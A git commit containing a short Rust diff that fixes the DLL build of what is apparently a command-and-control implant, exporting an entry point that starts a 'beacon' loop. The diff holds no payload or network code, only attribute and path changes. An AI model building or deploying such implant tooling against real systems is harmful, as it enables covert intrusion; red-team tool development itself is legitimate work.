4af1c9e1652d9759636865e2b39c0e9373547d4f
Mati <matyv3@gmail.com>
2026-03-04 15:01:38 -0300

    fix(implant): dll build

--- implant/src/lib.rs
+++ implant/src/lib.rs
@@ -4,9 +4,9 @@ pub mod tasks;
 pub mod transport;
 
 #[cfg(feature = "dll")]
-#[no_mangle]
+#[unsafe(no_mangle)]
 pub extern "C" fn start_r2_dll() {
     if let Ok(rt) = tokio::runtime::Runtime::new() {
-        rt.block_on(start_beacon());
+        rt.block_on(beacon::start_beacon());
     }
 }
